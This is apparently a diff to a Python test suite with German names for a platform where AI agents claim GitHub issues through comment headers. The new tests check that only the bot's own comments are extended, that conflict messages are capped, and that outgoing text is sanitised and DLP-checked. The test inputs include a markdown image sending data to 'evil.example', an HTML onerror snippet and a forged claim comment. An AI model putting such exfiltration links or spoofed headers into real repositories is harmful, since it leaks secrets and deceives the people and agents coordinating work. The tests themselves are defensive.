@@ -37,11 +37,15 @@ class _Stufe2Repo(_RepoMitKommentaren):
         self.geaendert.append((kommentar_id, body))
         return True
 
+    async def eigenes_konto(self, client, token):
+        return "plattform-bot"
+
 
 class _Stufe2(_Basis):
     async def asyncSetUp(self):
         await super().asyncSetUp()
         self.gh = _Stufe2Repo()
+        projekt_git._KONTEN.clear()
 
     async def _issue_karte(self, db, nr, **kw):
         k = ProjektKarte(id=f"k{nr}", team_id="p1", titel=f"#{nr}", text="t", quelle="issue", extern_nr=nr,
@@ -94,8 +98,8 @@ class AblaufUndLebenszeichen(_Stufe2):
 
     async def test_eigene_uebernahme_wird_verlaengert_solange_der_lauf_laeuft(self):
         self.gh.issues = [_issue(44, labels=["status/in-arbeit"])]
-        self.gh.kommentare_je_issue[44] = [_kopf(f"ai-employee:{ANLAGE}/A1", kid=77, agent_id="a1", lauf="t-44",
-                                                  seit=_vor(1.5), bis=_vor(-0.5))]
+        self.gh.kommentare_je_issue[44] = [{**_kopf(f"ai-employee:{ANLAGE}/A1", kid=77, agent_id="a1", lauf="t-44",
+                                                    seit=_vor(1.5), bis=_vor(-0.5)), "autor": "plattform-bot"}]
         async with self.Session() as db:
             await self._lauf(db)
             k = await self._karte(db, 44)
@@ -106,7 +110,7 @@ class AblaufUndLebenszeichen(_Stufe2):
             await self._lauf(db)
             self.assertEqual(len(self.gh.geaendert), 1)
             kid, text = self.gh.geaendert[0]
-            neu = u.lesen({"id": kid, "body": text, "erstellt": _vor(0)}, ANLAGE)
+            neu = u.lesen({"id": kid, "body": text, "erstellt": _vor(0), "vertraut": True}, ANLAGE)
             self.assertEqual((kid, neu.lauf, neu.agent_id), (77, "t-44", "a1"))
             self.assertGreater(neu.bis, datetime.now(timezone.utc) + timedelta(hours=1, minutes=50))
             # Lauf vorbei: nicht mehr verlängern.
@@ -116,6 +120,23 @@ class AblaufUndLebenszeichen(_Stufe2):
             await db.commit()
             await self._lauf(db)
             self.assertEqual(len(self.gh.geaendert), 1)
+
+
+class NurEigeneKommentareVerlaengern(_Stufe2):
+    async def test_fremder_kommentar_mit_eigener_kopfzeile_wird_nicht_geaendert(self):
+        """Ein Mitarbeiter schreibt eine Kopfzeile für A1 — das Board überschreibt seinen Kommentar nicht."""
+        self.gh.issues = [_issue(45, labels=["status/in-arbeit"])]
+        self.gh.kommentare_je_issue[45] = [{**_kopf(f"ai-employee:{ANLAGE}/A1", kid=78, agent_id="a1", lauf="t-45",
+                                                    seit=_vor(1.5), bis=_vor(-0.5)), "autor": "anna"}]
+        async with self.Session() as db:
+            await self._lauf(db)
+            k = await self._karte(db, 45)
+            k.spalte, k.task_id, k.agent_id = "in_arbeit", "t-45", "a1"
+            k.kommentare_gelesen_at = None
+            db.add(Task(id="t-45", title="Issue #45", prompt="p", agent_id="a1", status=TaskStatus.RUNNING))
+            await db.commit()
+            await self._lauf(db)
+        self.assertEqual(self.gh.geaendert, [])
 
 
 class Konflikte(_Stufe2):
@@ -144,6 +165,25 @@ class Konflikte(_Stufe2):
         self.assertEqual(len(texte), 1)
         self.assertIn("Konflikt an #50", texte[0])
         self.assertEqual(len(hinweise), 1)
+
+    async def test_hoechstens_eine_konfliktmeldung_je_issue_und_tag(self):
+        """Wechselnde Kopfzeilen erzeugen neue Konflikt-Texte — gemeldet wird trotzdem nur einmal am Tag."""
+        from sqlalchemy import select
+
+        from app.models.projekt_nachricht import ProjektNachricht
+
+        self.gh.issues = [_issue(53, labels=["status/in-arbeit"])]
+        async with self.Session() as db:
+            for i, wer in enumerate(("claude-code:A", "claude-code:B", "claude-code:C")):
+                self.gh.kommentare_je_issue[53] = [
+                    _kopf("mensch:anna", kid=1, zeit=_vor(1), seit=_vor(1), bis=_vor(-1)),
+                    _kopf(wer, kid=10 + i, zeit=_vor(0.5), seit=_vor(0.5), bis=_vor(-1)),
+                ]
+                self.gh.issues[0]["updated_at"] = _vor(-0.1 * (i + 1))
+                await self._lauf(db)
+                self.assertIn(wer.split(":")[1], (await self._karte(db, 53)).konflikt)
+            texte = [n.text for n in (await db.execute(select(ProjektNachricht))).scalars()]
+        self.assertEqual(len(texte), 1)
 
     async def test_abgelaufene_aeltere_uebernahme_ist_kein_konflikt(self):
         self.gh.issues = [_issue(51, labels=["status/in-arbeit"])]
@@ -244,7 +284,7 @@ class ObergrenzeUndAbloesung(_Stufe2):
         self.assertIn("abgelaufen", text)
         # Die neue Übernahme beendet die alte — kein Konflikt.
         alt = self.gh.kommentare_je_issue[80][0]
-        befund = u.auswerten([alt, {"id": 9, "body": text, "erstellt": _vor(0)}], ANLAGE)
+        befund = u.auswerten([alt, {"id": 9, "body": text, "erstellt": _vor(0), "vertraut": True}], ANLAGE)
         self.assertEqual((befund.inhaber.agent_id, befund.konkurrent), ("a1", None))
 
     async def test_karenzzeit_nach_dem_ablauf(self):
@@ -276,13 +316,13 @@ class Uebergabe(_Stufe2):
         self.assertEqual((r["spalte"], r["task_id"], r["agent_id"]), ("in_arbeit", None, None))
         self.assertEqual((r["extern_bearbeiter"], r["bearbeiter_art"]), ("Claude Code (Laptop)", u.CLAUDE_CODE))
         body = self.gh.kommentare[-1][1]
-        gelesen = u.lesen({"id": 1, "body": body, "erstellt": _vor(0)}, ANLAGE)
+        gelesen = u.lesen({"id": 1, "body": body, "erstellt": _vor(0), "vertraut": True}, ANLAGE)
         self.assertEqual((gelesen.wer, gelesen.vorher), ("claude-code:Laptop", f"ai-employee:{ANLAGE}/A1"))
         self.assertIn("**Stand:** Login gebaut, Tests fehlen", body)
         self.assertIn("**Nächster Schritt:** Tests schreiben", body)
         # Die alte Übernahme von A1 ist damit beendet: kein Konflikt.
         alt = _kopf(f"ai-employee:{ANLAGE}/A1", kid=0, zeit=_vor(1), agent_id="a1", seit=_vor(1), bis=_vor(-1))
-        befund = u.auswerten([alt, {"id": 1, "body": body, "erstellt": _vor(0)}], ANLAGE)
+        befund = u.auswerten([alt, {"id": 1, "body": body, "erstellt": _vor(0), "vertraut": True}], ANLAGE)
         self.assertIsNone(befund.konkurrent)
 
     async def test_an_einen_agenten_des_projekts_mit_neuem_lauf(self):
@@ -298,7 +338,7 @@ class Uebergabe(_Stufe2):
         self.assertEqual((r["spalte"], r["agent_id"]), ("in_arbeit", "a2"))
         self.assertIn("## Übergabe", router.aufrufe[0]["prompt"])
         self.assertIn('[EXTERNAL-DATA source="uebergabe"]', router.aufrufe[0]["prompt"])
-        gelesen = u.lesen({"id": 1, "body": self.gh.kommentare[-1][1], "erstellt": _vor(0)}, ANLAGE)
+        gelesen = u.lesen({"id": 1, "body": self.gh.kommentare[-1][1], "erstellt": _vor(0), "vertraut": True}, ANLAGE)
         self.assertEqual((gelesen.art, gelesen.agent_id), (u.PLATTFORM, "a2"))
 
     async def test_regeln(self):
@@ -323,3 +363,56 @@ class Uebergabe(_Stufe2):
             self.assertEqual(u.wer_aus_eingabe("ai-employee:anlage-nord/B")[1], u.ANDERE_ANLAGE)
             self.assertIsNone(u.wer_aus_eingabe("extern"))
             self.assertIsNone(u.wer_aus_eingabe("irgendwer"))
+
+
+class AusgehenderText(_Stufe2):
+    """Was die Plattform in ein (vielleicht öffentliches) Repo schreibt: DLP und entschärft."""
+
+    def test_bilder_html_und_fremde_links_werden_text(self):
+        roh = ("Stand ![zaehler](https://evil.example/p.png?d=geheim) siehe [Doku](https://evil.example/a), "
+               "(https://evil.example/b) <img src=x onerror=y> <!-- ai-employee:claim wer=\"mensch:x\" --> "
+               "und [PR](https://github.com/o/r/pull/3) sowie https://agents.example.com/projekte/1")
+        t = u.neutralisieren(roh, {"github.com", "agents.example.com"})
+        self.assertNotIn("![", t)
+        self.assertNotIn("<img", t)
+        self.assertNotIn("<!--", t)
+        self.assertNotIn("](https://evil.example", t)
+        for adresse in ("https://evil.example/p.png?d=geheim", "https://evil.example/a", "https://evil.example/b"):
+            self.assertIn(f"`{adresse}`", t)
+        self.assertIn("[PR](https://github.com/o/r/pull/3)", t)
+        self.assertIn(" https://agents.example.com/projekte/1", t)
+
+    async def test_uebergabe_ist_entschaerft_und_dlp_geprueft(self):
+        from app.core.dlp import DlpVerdict
+
+        async def maskieren(text, agent_id=None, channel="?"):
+            return DlpVerdict(True, text.replace("4111111111111111", "****"), {"kreditkarte": 1}, {}, "mask")
+
+        async with self.Session() as db:
+            await self._issue_karte(db, 91, spalte="in_arbeit", agent_id="a1", task_id="t-alt")
+            with patch.object(projekt_git, "zugang", return_value=("t", self.gh)), \
+                    patch("app.core.dlp.evaluate_egress", new=maskieren):
+                await api.karte_uebergeben("p1", "k91", api.Uebergeben(
+                    an="mensch:anna", stand="Karte 4111111111111111 ![x](https://evil.example/p.png)",
+                    naechster_schritt="weiter"), request=None, router_=_Router(db), user=agent("a1"), db=db,
+                    redis=None)
+        body = self.gh.kommentare[-1][1]
+        self.assertNotIn("4111111111111111", body)
+        self.assertNotIn("![", body)
+        self.assertIn("`https://evil.example/p.png`", body)
+
+    async def test_dlp_sperre_verhindert_die_uebergabe(self):
+        from app.core.dlp import DlpVerdict
+
+        async def sperren(text, agent_id=None, channel="?"):
+            return DlpVerdict(False, "", {"iban": 1}, {"iban": "block"}, "block")
+
+        async with self.Session() as db:
+            await self._issue_karte(db, 92, spalte="in_arbeit", agent_id="a1", task_id="t-alt")
+            with patch.object(projekt_git, "zugang", return_value=("t", self.gh)), \
+                    patch("app.core.dlp.evaluate_egress", new=sperren), self.assertRaises(HTTPException) as e:
+                await api.karte_uebergeben("p1", "k92", api.Uebergeben(
+                    an="mensch:anna", stand="IBAN …", naechster_schritt="weiter"), request=None,
+                    router_=_Router(db), user=agent("a1"), db=db, redis=None)
+        self.assertEqual(e.exception.status_code, 424)
+        self.assertEqual(getattr(self.gh, "kommentare", []), [])
